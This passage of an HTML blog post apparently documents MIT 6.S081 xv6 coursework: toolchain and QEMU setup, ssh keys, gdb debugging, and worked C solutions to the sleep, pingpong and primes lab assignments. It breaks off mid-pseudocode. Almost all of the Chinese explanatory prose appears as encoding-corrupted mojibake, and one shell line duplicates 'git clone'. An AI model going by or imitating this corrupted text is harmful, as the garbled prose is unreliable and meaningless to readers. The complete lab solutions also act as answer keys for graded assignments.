title="Preparation"></a>Preparation</h1><p>è¿™éƒ¨åˆ†æ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦æˆ‘ä»¬é…ç½®xv6çš„ç¼–è¯‘ã€è°ƒè¯•ç¯å¢ƒã€å®‰è£…ç¼–è¯‘é“¾ç­‰ï¼Œç”±äºGFWçš„åŸå› ï¼Œè¿™ä¸ªé˜¶æ®µä¼šæ¯”è¾ƒegg painã€‚æ¯”å¦‚ï¼š</p><ul><li>éœ€è¦åœ¨x64æœºå™¨ä¸Šç”Ÿæˆriscvçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦äº¤å‰ç¼–è¯‘å™¨ï¼Œä¹Ÿå³æ˜¯<strong>riscv-gnu-toolchain</strong>ï¼ˆæºç 8GBï¼ŒåŠ¨ä¸åŠ¨å°±ç½‘ç»œé”™è¯¯ï¼‰</li><li>qemuä½œä¸ºæ¨¡æ‹Ÿå™¨å»è¿è¡Œxv6ç³»ç»Ÿ</li><li>ä½¿ç”¨qemu-gdb remoteè¿›è¡Œè°ƒè¯•</li><li>æ‹‰å–æºç ï¼Œæµ‹è¯•ä½¿ç”¨make gradeè‡ªåŠ¨è¯„åˆ†</li><li>sshã€è™šæ‹Ÿæœºé…ç½®ç­‰ç­‰</li></ul><p>å®˜æ–¹çš„ç¯å¢ƒæ­å»ºæŒ‡å¯¼ï¼š<a href="https://pdos.csail.mit.edu/6.828/2020/tools.html">https://pdos.csail.mit.edu/6.828/2020/tools.html</a> <strong>éƒ¨åˆ†å¦‚ä¸‹æ‰€è¿°å¹¶ä¸åŒäºå®˜æ–¹çš„ç¯å¢ƒæ­å»ºæ–¹å¼ï¼š</strong></p><h2 id="å®‰è£…ç¼–è¯‘é“¾"><a href="#å®‰è£…ç¼–è¯‘é“¾" class="headerlink" title="å®‰è£…ç¼–è¯‘é“¾"></a>å®‰è£…ç¼–è¯‘é“¾</h2><p>ä½¿ç”¨aptå®‰è£…ä¸€äº›ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install autoconf automake autotools-dev curl libmpc-dev libmpfr-dev libgmp-dev gawk build-essential bison flex texinfo gperf libtool patchutils bc zlib1g-dev libexpat-dev<br>$ sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu <br></code></pre></td></tr></table></figure><blockquote><p><strong>äº¤å‰ç¼–è¯‘å™¨</strong>ï¼ˆè‹±è¯­ï¼šCross compilerï¼‰æ˜¯æŒ‡ä¸€ä¸ªåœ¨æŸä¸ª<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">ç³»ç»Ÿå¹³å°</a>ä¸‹å¯ä»¥äº§ç”Ÿå¦ä¸€ä¸ª<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">ç³»ç»Ÿå¹³å°</a>çš„<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">å¯æ‰§è¡Œæ–‡ä»¶</a>çš„<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91%E5%99%A8">ç¼–è¯‘å™¨</a>ã€‚äº¤å‰ç¼–è¯‘å™¨åœ¨ç›®æ ‡<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">ç³»ç»Ÿå¹³å°</a>ï¼ˆå¼€å‘å‡ºæ¥çš„åº”ç”¨ç¨‹åºåºæ‰€è¿è¡Œçš„å¹³å°ï¼‰éš¾ä»¥æˆ–ä¸å®¹æ˜“<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91">ç¼–è¯‘</a>æ—¶éå¸¸æœ‰ç”¨</p></blockquote><p>ç”±äº<strong>riscv-gnu-toolchainæ€»å¤§å°çº¦æœ‰8GBå·¦å³</strong>ï¼Œé€šè¿‡å®˜æ–¹çš„aptå’Œä¸‹è½½æºç çš„æ–¹å¼éƒ½éå¸¸çš„æ…¢ï¼Œç”šè‡³ç»å¸¸ä¸­æ–­ä¸‹è½½ï¼Œå¤šæ¬¡å°è¯•æ— æœåï¼Œæˆ‘ä½¿ç”¨äº†åœ¨å®¿ä¸»æœºä¸Šä¸‹è½½æºç åŒ…ï¼ˆä½¿ç”¨idmå¤šçº¿ç¨‹ä¸‹è½½githubçš„æºç æˆ–è€…ç™¾åº¦äº‘ç°æˆçš„æºç æ–‡ä»¶ï¼‰ï¼Œä¹‹åå°†è¿™ä¸€å¤§å¨<code>.tar.gz</code>æºç å¤åˆ¶åˆ°Ubuntuè™šæ‹Ÿæœºçš„æ–¹å¼è·å–æºç ï¼Œä¹‹åè¿›è¡Œç¼–è¯‘</p><p>è§£å‹ï¼Œä¹‹åè¿›è¡Œç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> tar zxvf *.gz</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> riscv-gnu-toolchain</span><br><span class="hljs-meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="hljs-built_in">local</span></span><br><span class="hljs-meta">$</span><span class="bash"> sudo make -j8</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¼–è¯‘è¿‡ç¨‹å°†ä¼šååˆ†æ¼«é•¿ï¼Œè™šæ‹Ÿæœºé…ç½®ä½ç”šè‡³ä¼šå¡æ­»ï¼Œå»ºè®®å¼€ä¸ªtmuxï¼Œdetachä¹‹åä½¿ç”¨-jå¤šæ ¸ç¼–è¯‘é€‰é¡¹</p><p>ç¼–è¯‘ä¹‹åç¯å¢ƒå°±å…¨éƒ¨é…å¥½äº†ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ riscv64-unknown-elf-gcc --version <span class="hljs-comment">#æŸ¥çœ‹æ˜¯ä¸æ˜¯æœ‰ç‰ˆæœ¬ä¿¡æ¯è¾“å‡º</span><br>$ qemu-system-riscv64 --version<br></code></pre></td></tr></table></figure><p>ä»githubä¸‹è½½xv6æºç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git://github.com/mit-pdos/xv6-riscv-fall19.git<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘xv6å†…æ ¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make qemu<br>$<br></code></pre></td></tr></table></figure><p>æ­£å¸¸ç¼–è¯‘æˆåŠŸä¼šå¾—åˆ°xv6çš„ç»ˆç«¯çš„æç¤ºç¬¦ï¼Œè¿™é‡Œæˆ‘é‡åˆ°äº†ç‰ˆæœ¬è¿‡é«˜çš„é—®é¢˜ï¼Œå¯¼è‡´ä¾èµ–é”™è¯¯ï¼Œæ— æ³•å®‰è£…ï¼Œå¸è½½é«˜ç‰ˆæœ¬å³å¯</p><p>ä½¿ç”¨<code>Ctrl-a x</code>é€€å‡º</p><p>é¡ºä¾¿çœ‹ä¸€ä¸‹riscv-gnu-toolchainææ€–çš„å¤§å°ï¼Œå°±çŸ¥é“ä¸ºä»€ä¹ˆç”¨gitæˆ–è€…apt ä¸‹ä¸ä¸‹æ¥äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> du -hs ../*</span><br>8.0G    ../riscv-gnu-toolchain<br>3.6G    ../riscv-gnu-toolchain.tar.gz<br>26M     ../xv6-riscv<br></code></pre></td></tr></table></figure><h2 id="è™šæ‹Ÿæœºåˆå§‹è®¾ç½®"><a href="#è™šæ‹Ÿæœºåˆå§‹è®¾ç½®" class="headerlink" title="è™šæ‹Ÿæœºåˆå§‹è®¾ç½®"></a>è™šæ‹Ÿæœºåˆå§‹è®¾ç½®</h2><ul><li>ä½¿ç”¨22.04 Ubuntu LTSè™šæ‹Ÿæœº</li><li>aptæ¢æºã€updateã€upgrade</li><li>é…ç½®vmware tools</li><li>å®‰è£…ç¼–è¯‘ä¾èµ–</li></ul><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>æˆ‘çš„å®¿ä¸»æœºæ˜¯Windowsï¼Œxv6å®‰è£…åœ¨Ubuntuè™šæ‹Ÿæœºä¸­</p><p>è¢«è¿æ¥çš„ä¸»æœºå¿…é¡»è¦å®‰è£…opensshæœåŠ¡ï¼Œæ¯”å¦‚æˆ‘è¦è¿æ¥åˆ°æˆ‘çš„Debianæˆ–è€…Ubuntuï¼Œé‚£ä¹ˆä»–ä»¬éƒ½éœ€è¦å®‰è£…openssh</p><p>Debianæˆ–è€…Ubuntuçš„å®‰è£…å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install openssh-server<br></code></pre></td></tr></table></figure><p>é‡åˆ°äº†ä¾èµ–é”™è¯¯ï¼Œå¯¼è‡´æ— æ³•å®‰è£…openssh-serverï¼Œå¸è½½openssh-clientä¹‹åå®‰è£…openssh-serverå³å¯</p><p>å¯åŠ¨æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service sshd start<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦å·²ç»å¯åŠ¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -ef | grep sshd<br></code></pre></td></tr></table></figure><p><strong>ç”Ÿæˆå…¬é’¥ä¸ç§é’¥ï¼Œï¼š</strong></p><p>ä½¿ç”¨key-genå‘½ä»¤ç”Ÿæˆå…¬é’¥ä¸ç§é’¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh-keygen</span><br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/c/Users/xxx/.ssh/id_rsa):<br></code></pre></td></tr></table></figure><p>ä¹‹åä¿®æ”¹æœåŠ¡å™¨çš„authorized_keysæ–‡ä»¶ï¼Œä¹Ÿå³å°†ä¸Šè¿°æ­¥éª¤ä¸­ç”Ÿæˆçš„å…¬é’¥ï¼ˆ.pubæ–‡ä»¶ï¼‰å†™å…¥åˆ°è¿œç¨‹æœåŠ¡å™¨çš„ <code>~/.ssh/authorized_keys</code>æ–‡ä»¶ä¸­</p><h2 id="run-amp-debug"><a href="#run-amp-debug" class="headerlink" title="run&amp;debug"></a>run&amp;debug</h2><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>åœ¨Makefileæ‰€åœ¨æ–‡ä»¶ç›®å½•è¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br></code></pre></td></tr></table></figure><p>QEMU çš„è™šæ‹Ÿ BIOS å°†ä»åŒ…å«åœ¨ xv6.img æ–‡ä»¶ä¸­çš„è™šæ‹Ÿç¡¬ç›˜æ˜ åƒåŠ è½½ xv6çš„å¼•å¯¼åŠ è½½ç¨‹åºï¼Œboot loaderå°†ä¾æ¬¡åŠ è½½å¹¶è¿è¡Œ xv6å†…æ ¸</p><p>åœ¨å‘½ä»¤è¡Œä¸Šï¼Œå°†ä¼šå‡ºç°è®¸å¤šæç¤ºæ–‡å­—ï¼Œæœ€åä¸€è¡Œä¼šæœ‰ä¸€ä¸ª$ï¼Œè¡¨ç¤ºæ˜¯xv6ç³»ç»Ÿçš„å‘½ä»¤æç¤ºç¬¦</p><p>å¦‚æœæƒ³è¦ç»“æŸQEMU ä¼šè¯ï¼Œå¹¶é”€æ¯ xv6è™šæ‹Ÿæœºçš„çŠ¶æ€ï¼ŒæŒ‰ä¸‹Ctrl-Cå³å¯</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>åœ¨xv6ç›®å½•ï¼Œæ‰“å¼€ä¸€ä¸ªshellï¼Œè¾“å…¥ make qemu-gdbï¼Œqemuä¼šå¡ä½ï¼Œç­‰å¾…gdbä¸ä»–è¿æ¥</p><p>åœ¨xv6ç›®å½•æ‰“å¼€å¦ä¸€ä¸ªshellï¼Œè¾“å…¥riscv64-unknown-elf-gdbï¼Œå³å¯è¿œç¨‹debug</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://web.archive.org/web/20190308091152/http://zoo.cs.yale.edu:80/classes/cs422/2011/lec/l2-hw">https://web.archive.org/web/20190308091152/http://zoo.cs.yale.edu:80/classes/cs422/2011/lec/l2-hw</a></li><li><a href="https://blog.csdn.net/weixin_48156266/article/details/123663977">https://blog.csdn.net/weixin_48156266/article/details/123663977</a></li><li><a href="https://github.com/riscv-collab/riscv-gnu-toolchain">https://github.com/riscv-collab/riscv-gnu-toolchain</a></li></ul><h1 id="Lab1-Xv6-and-Unix-utilities"><a href="#Lab1-Xv6-and-Unix-utilities" class="headerlink" title="Lab1 Xv6 and Unix utilities"></a>Lab1 Xv6 and Unix utilities</h1><blockquote><p>è¿›è¡Œç³»ç»Ÿå·¥å…·ï¼ˆæ¯”å¦‚findã€xargsï¼‰çš„ç¼–å†™ï¼Œä¸»è¦æ˜¯è®©ä½ å»ç†Ÿæ‚‰æ“ä½œç³»ç»ŸAPIã€‚è¿™é‡Œæœ€æœ‰è¶£çš„æ˜¯primesç¨‹åºï¼Œè¦æ±‚ä½ ä½¿ç”¨å¹¶å‘çš„æ–¹å¼å®ç°ç´ æ•°ç­›ï¼Œæ¶‰åŠç®¡é“ã€è¿›ç¨‹é€šä¿¡ã€å¹¶å‘ã€é€’å½’</p></blockquote><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://pdos.csail.mit.edu/6.828/2020/labs/util.html">https://pdos.csail.mit.edu/6.828/2020/labs/util.html</a></p><h2 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git <span class="hljs-built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020 <span class="hljs-comment"># æ‹‰å–ä»“åº“</span></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> xv6-labs-2020</span><br><span class="hljs-meta">$</span><span class="bash"> git checkout util <span class="hljs-comment"># åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="hljs-meta">$</span><span class="bash"> make</span> <br><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br><span class="hljs-meta">$</span><span class="bash"> make grade <span class="hljs-comment"># è‡ªåŠ¨è¯„æµ‹æ‰€æœ‰çš„ç¨‹åº</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./grade-lab-util sleep <span class="hljs-comment"># è¯„æµ‹å•ä¸ªç¨‹åºsleep</span></span><br></code></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>Implement the UNIX program <code>sleep</code> for xv6; your <code>sleep</code> should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file <code>user/sleep.c</code>.</p><ul><li>åœ¨Makefileä¸­çš„UPROGä¸‹é¢åŠ å…¥sleep</li><li>åœ¨userç›®å½•åˆ›å»ºsleep.cæ–‡ä»¶</li><li>sleep.cåŠ å…¥çš„ä¸‰ä¸ªå¤´æ–‡ä»¶æ˜¯æ¨¡ä»¿äº†å…¶ä»–user/ç›®å½•çš„é£æ ¼</li><li>é¦–å…ˆè¿›è¡Œå‚æ•°çš„æ£€æŸ¥ï¼Œå¼‚å¸¸åˆ™é€€å‡º</li><li>ç›´æ¥è°ƒç”¨sleep()å‡½æ•°å³å¯ï¼Œå¯ä»¥åœ¨åˆ«çš„ç¨‹åºä¸­æ‰¾åˆ°è¿™ç§ç”¨æ³•</li><li>exit(0)é€€å‡ºç¨‹åº</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;Usage: sleep [times]\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(atoi(argv[<span class="hljs-number">1</span>]));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æŠ¥é”™ï¼šuser/sh.c:58:1: error: infinite recursion detected [-Werror=infinite-recursion]ï¼Œè§£å†³åŠæ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><p>Write a program that uses UNIX system calls to â€˜â€™ping-pongâ€™â€™ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print â€œ<pid>: received pingâ€, where <pid> is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print â€œ<pid>: received pongâ€, and exit. Your solution should be in the file <code>user/pingpong.c</code>.</p><ul><li>int fd[2]åˆ›å»ºç®¡é“ï¼Œfd[0]è¯»ã€fd[1]å†™</li><li>ç®¡é“ç”¨æ³•ï¼šä¸€èˆ¬å…ˆåˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œç„¶åè¿›ç¨‹ä½¿ç”¨forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹ï¼Œä¹‹åçˆ¶è¿›ç¨‹å…³é—­ç®¡é“çš„è¯»ç«¯ï¼Œå­è¿›ç¨‹å…³é—­ç®¡é“çš„å†™ç«¯</li><li>è°ƒç”¨fork åï¼Œçˆ¶è¿›ç¨‹çš„ fork() ä¼šè¿”å›å­è¿›ç¨‹çš„ PIDï¼Œå­è¿›ç¨‹çš„forkè¿”å› 0</li><li>æ³¨æ„åˆ°writeç³»ç»Ÿè°ƒç”¨æ˜¯<code>ssize_t write(int fd, const void *buf, size_t count);</code>ï¼Œå› æ­¤å†™å…¥çš„å­—èŠ‚æ˜¯ä¸€ä¸ªåœ°å€ï¼Œç”±äºæˆ‘ä»¬å£°æ˜bufæ˜¯ä¸€ä¸ªcharç±»å‹ï¼Œå› æ­¤éœ€è¦å¡«å…¥&amp;buf</li><li>è¿™é‡Œè¸©äº†ä¸€ä¸ªå‘ï¼ŒæŠŠpingpongå†™æˆäº†pingpangå¯¼è‡´é”™è¯¯</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd1[<span class="hljs-number">2</span>],fd2[<span class="hljs-number">2</span>];<br>    pipe(fd1);<br>    pipe(fd2);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-comment">// child</span><br>    <span class="hljs-comment">// print &quot;&lt;pid&gt;: received ping&quot;</span><br>    <span class="hljs-comment">// write back to parent a byte and exit </span><br>    <span class="hljs-comment">// close fd[1]</span><br>    <span class="hljs-comment">// zero for read and 1 for read </span><br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)  <br>    &#123;<br>        close(fd1[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        close(fd2[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        read(fd1[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//read a byte from parent</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received ping\n&quot;</span>,getpid()); <br>        write(fd2[<span class="hljs-number">1</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//write back to parent </span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// parent</span><br>    <span class="hljs-comment">// send a byte to the child </span><br>    <span class="hljs-comment">// close fd[0]</span><br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        close(fd1[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        close(fd2[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        write(fd1[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">// send a byte to the child</span><br>        read(fd2[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received pong\n&quot;</span>,getpid()); <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230208224322.png"></p><h2 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h2><p>Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down <a href="http://swtch.com/~rsc/thread/">this page</a> and the surrounding text explain how to do it. Your solution should be in the file <code>user/primes.c</code>.</p><p>Your goal is to use <code>pipe</code> and <code>fork</code> to set up the pipeline. The first process feeds the numbers 2 through 35 into the pipeline. For each prime number, you will arrange to create one process that reads from its left neighbor over a pipe and writes to its right neighbor over another pipe. Since xv6 has limited number of file descriptors and processes, the first process can stop at 35.</p><ul><li>ä½¿ç”¨pipeå’Œforkæ¥è®¾ç½®ç®¡é“</li><li>ç”±äºxv6æ–‡ä»¶æè¿°ç¬¦å¾ˆå°‘ï¼Œæ‰€ä»¥éœ€è¦å…³é—­æ‰€æœ‰ä¸å¿…è¦çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦åˆ™å°†ä¼šå¯¼è‡´æè¿°ç¬¦è€—å°½</li><li>ä¸»è¦çš„ç´ æ•°è¿›ç¨‹åº”è¯¥åªæœ‰åœ¨æ‰€æœ‰çš„è¾“å‡ºéƒ½æ‰“å°å‡ºæ¥ä¹‹åï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰å…¶ä»–çš„ç´ æ•°è¿›ç¨‹éƒ½é€€å‡ºä¹‹åæ‰èƒ½é€€å‡º</li><li>å…³äºreadçš„ç”¨æ³•ï¼šå½“ç®¡é“çš„å†™ç«¯å…³é—­æ—¶ï¼Œread è¿”å›é›¶ï¼Œè¿™ä¸ªå¯ä»¥æ§åˆ¶whileçš„ç»ˆæ­¢æ¡ä»¶</li><li>ä¿®æ”¹Makefile çš„ UPROGS</li></ul><p>æ™®é€šçš„Cè¯­è¨€å†™æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes2</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br><br>        <span class="hljs-keyword">if</span>(!st[i]) primes[cnt++]=i;<span class="hljs-comment">//æŠŠç´ æ•°å­˜èµ·æ¥</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i)&#123;<span class="hljs-comment">//ä¸ç®¡æ˜¯åˆæ•°è¿˜æ˜¯è´¨æ•°ï¼Œéƒ½ç”¨æ¥ç­›æ‰åé¢å®ƒçš„å€æ•°</span><br>            st[j]=<span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes1</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!st[i])&#123;<br>            primes[cnt++]=i;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i) st[j]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//å¯ä»¥ç”¨è´¨æ•°å°±æŠŠæ‰€æœ‰çš„åˆæ•°éƒ½ç­›æ‰ï¼›</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¹¶å‘ç¼–ç¨‹çš„æ€è·¯ä¸åŒäºä»¥ä¸Šæ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å‡ºä¼ªä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p = get a number from left neighbor<br>print p<br>loop:<br>    n = get a number from left neighbor<br>    <span class="hljs-keyword">if</span> (p does <span class="hljs-keyword">not</span> divide n)<br>    